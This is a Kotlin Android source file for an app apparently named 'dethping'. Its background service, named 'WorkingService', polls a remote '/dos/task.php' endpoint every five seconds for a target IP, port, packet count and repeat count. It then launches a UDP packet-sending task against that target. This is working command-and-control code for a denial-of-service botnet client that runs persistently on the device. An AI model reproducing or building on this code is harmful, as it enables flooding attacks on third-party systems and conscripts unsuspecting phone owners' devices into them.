package `in`.planckstudio.dethping

// Do not delete/edit this file.

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class WorkingService : Service() {

    private var senderTask: UDPSenderTask? = null
    private var isRunning: Boolean = false

    companion object {
        private const val TAG = "BackgroundService"
        private const val SERVER_URL = "https://test.planckstudio.in/dos/task.php"
    }

    private lateinit var handler: Handler
    private lateinit var task: Runnable

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        handler = Handler()
        task = object : Runnable {
            override fun run() {
                checkJsonFile()
                handler.postDelayed(this, 5000) // Run every 30 seconds
            }
        }
        handler.post(task)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service stopped")
        handler.removeCallbacks(task)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun checkJsonFile() {
        Thread {
            try {
                val url = URL(SERVER_URL)
                val connection = url.openConnection() as HttpURLConnection
                connection.connect()
                val inputStream = connection.inputStream
                val bufferedReader = BufferedReader(InputStreamReader(inputStream))
                val stringBuilder = StringBuilder()
                var line: String?
                while (bufferedReader.readLine().also { line = it } != null) {
                    stringBuilder.append(line)
                }
                bufferedReader.close()
                inputStream.close()
                connection.disconnect()

                val json = JSONObject(stringBuilder.toString())
                val status = json.getBoolean("status")
                if (status) {
                    val ip = json.getString("ip")
                    val port = json.getInt("port")
                    val packets = json.getInt("packets")
                    val repeat = json.getInt("repeat")
                    senderTask = UDPSenderTask(ip, port, packets, repeat)

                    if (!isRunning) {
                        Log.d(
                            TAG,
                            "Status is true. Calling function with data: $ip, $port, $packets, $repeat"
                        )
                        senderTask!!.execute()
                    } else {
                        Log.d(TAG, "Task is already runnung")
                    }

                    // CallFunctionWithData(ip, port, packets, repeat)
                } else {
                    Log.d(TAG, "Status is false. Calling another function")
                    // CallAnotherFunction()
                    senderTask?.cancel(true)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            }
        }.start()
    }
}
